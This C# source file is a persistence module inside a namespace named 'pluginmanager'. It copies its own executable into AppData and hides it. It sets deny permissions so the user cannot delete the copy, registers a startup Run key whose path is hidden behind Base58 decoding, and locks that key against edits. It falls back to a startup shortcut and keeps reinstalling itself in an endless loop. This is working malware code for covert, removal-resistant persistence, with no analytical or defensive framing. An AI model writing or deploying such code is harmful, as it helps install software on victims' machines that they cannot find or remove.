using System;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;

namespace pluginmanager.Lifetime
{
    public class Register
    {
        private string user = Environment.UserDomainName + "\\" + Environment.UserName;
        private string startupPath = System.IO.Path.Combine(System.Environment.GetFolderPath(Environment.SpecialFolder.Startup), config.LinkName);
        private string installPath = System.IO.Path.Combine(System.Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), config.ExecName);
        public Register()
        {
            Logger.Log(this.ToString(), "started");
            new Task(() => { Install(); }).Start();
        }
        public void denyreg(RegistryKey key)
        {
            try
            {
                RegistrySecurity rs = new RegistrySecurity();
                rs.AddAccessRule(new RegistryAccessRule(user,
            RegistryRights.WriteKey | RegistryRights.ChangePermissions | RegistryRights.Delete,
            InheritanceFlags.None,
            PropagationFlags.None,
            AccessControlType.Deny));
                key.SetAccessControl(rs);
            }
            catch (Exception e)
            {
                Logger.Log(this.ToString(), $"Regaccess set failed {e.Message}");

            }
        }
        public static bool IsAdministrator()
        {
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
        }
        public void denyfile()
        {
            try
            {
                System.IO.File.SetAttributes(installPath, System.IO.FileAttributes.Hidden);
                FileSecurity rs = System.IO.File.GetAccessControl(installPath);
                rs.AddAccessRule(new FileSystemAccessRule(user, FileSystemRights.ChangePermissions | FileSystemRights.Delete,
            InheritanceFlags.None,
            PropagationFlags.None,
            AccessControlType.Deny));
                FileSecurity fSecurity = System.IO.File.GetAccessControl(installPath);
                System.IO.File.SetAccessControl(installPath, rs);
            }
            catch (Exception e)
            {
                Logger.Log(this.ToString(), $"Fileaccess set failed {e.Message}");
            }
        }
        public static bool IsStartup()
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(Encoding.UTF8.GetString(SimpleBase.Base58.Bitcoin.Decode("34ZJ43hwDSVTMSG8RJBYjgMYrHKfQtgMaT2pAjeRuju84nCxR5WcXtgiVGFczy")), false))
            {
                var found = key?.GetValue(config.Description);
                return found != null;
            }
        }
        public void Install()
        {
            while (true)
            {
                if (!System.IO.File.Exists(installPath))
                {
                    System.IO.File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, installPath);
                    denyfile();
                }
                if (!System.IO.File.Exists(startupPath))
                {
                    try
                    {
                        if (!IsAdministrator())
                        {
                            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(Encoding.UTF8.GetString(SimpleBase.Base58.Bitcoin.Decode("34ZJ43hwDSVTMSG8RJBYjgMYrHKfQtgMaT2pAjeRuju84nCxR5WcXtgiVGFczy")), true))
                            {
                                key.SetValue(config.Description, installPath);
                                denyreg(key);
                                Logger.Log(this.ToString(), "No admin, so using currentuser as startup");

                            }
                        }
                        else
                        {
                            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(Encoding.UTF8.GetString(SimpleBase.Base58.Bitcoin.Decode("34ZJ43hwDSVTMSG8RJBYjgMYrHKfQtgMaT2pAjeRuju84nCxR5WcXtgiVGFczy")), true))
                            {
                                key.SetValue(config.Description, installPath);
                                denyreg(key);
                                Logger.Log(this.ToString(), "im admin, localmachine startup");

                            }
                        }
                    }
                    catch (Exception e)
                    {
                        if (!IsStartup())
                        {
                            Logger.Log(this.ToString(), $"Reginstall failed, Using Lnk {e.Message}");
                            ShortcutUtil.appShortcutToPath(installPath, startupPath, config.Description);
                        }
                    }
                }
                System.Threading.Thread.Sleep(config.RegisterWaitInterval * 1000);
            }
        }
    }
}
